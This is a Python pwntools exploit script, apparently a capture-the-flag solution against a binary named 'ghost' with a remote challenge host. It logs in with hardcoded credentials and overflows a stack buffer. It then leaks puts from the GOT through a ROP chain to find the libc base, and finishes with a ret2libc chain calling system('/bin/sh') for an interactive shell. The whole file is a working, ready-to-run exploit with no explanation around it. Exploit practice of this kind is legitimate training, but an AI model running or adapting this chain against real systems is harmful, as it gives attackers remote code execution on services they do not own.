#!/usr/bin/env python3
from pwn import *

# Context for Ubuntu 22.04 (libc 2.35)
context.binary = elf = ELF("./ghost")
libc = ELF("./libc.so.6")
context.log_level = "info"

HOST, PORT = "127.0.0.1", 1337
OFFSET = 72

# Gadgets
# protocol_teardown provides: pop rdi ; ret
POP_RDI = 0x40131e 
# ret gadget for stack alignment (Essential for glibc 2.35 system calls)
RET     = 0x40101a 

def get_conn():
    if args.REMOTE:
        return remote("challenges.infodays.net", 1337)
    return remote(HOST, PORT)

def login(p):
    log.info("Bypassing password gate...")
    p.sendlineafter(b"Username:", b"operator")
    p.sendlineafter(b"Password:", b"ghostop")
    p.recvuntil(b"ghostshell> ")

def leak_libc(p):
    log.info("--- Stage 1: Leaking libc ---")
    
    # Payload: overflow -> puts(puts@got) -> main()
    payload = flat({
        OFFSET: [
            POP_RDI,
            elf.got['puts'],
            elf.plt['puts'],
            elf.symbols['main']
        ]
    })
    
    p.sendline(payload)

    # 1. Drain the echo: "[?] Unknown command: ..."
    # printf stops at the first null byte in our ROP chain.
    p.recvuntil(b"Unknown command: ")
    p.recvline() # Consume the rest of the junk line and the newline

    # 2. Capture the raw leak from puts()
    # puts prints the address bytes + \n. We grab exactly 6 bytes.
    raw_leak = p.recv(6)
    puts_leak = u64(raw_leak.ljust(8, b"\x00"))
    
    # Validation: libc addresses usually start with 0x7f or 0x76
    if not (0x700000000000 <= puts_leak <= 0x7fffffffffff):
        log.error(f"Invalid leak captured: {hex(puts_leak)}")

    log.success(f"puts() leak: {hex(puts_leak)}")
    libc.address = puts_leak - libc.symbols['puts']
    log.success(f"libc base:  {hex(libc.address)}")

    # 3. Clean up the banner from main() restart so Stage 2 is in sync
    p.recvuntil(b"Identity verification required.\n\n")
    
    return libc.address

def get_shell(p):
    log.info("--- Stage 2: ret2libc shell ---")
    
    system = libc.symbols['system']
    binsh  = next(libc.search(b"/bin/sh"))

    # Payload: overflow -> ret (alignment) -> system("/bin/sh")
    payload = flat({
        OFFSET: [
            RET, # 16-byte stack alignment
            POP_RDI,
            binsh,
            system
        ]
    })

    p.sendline(payload)
    log.success("GHOST PROTOCOL BYPASSED. System shell active.")
    p.interactive()

def main():
    p = get_conn()
    
    # Round 1: Get the leak
    login(p)
    leak_libc(p)

    # Round 2: Re-auth because we looped back to main()
    login(p)
    get_shell(p)

if __name__ == "__main__":
    main()
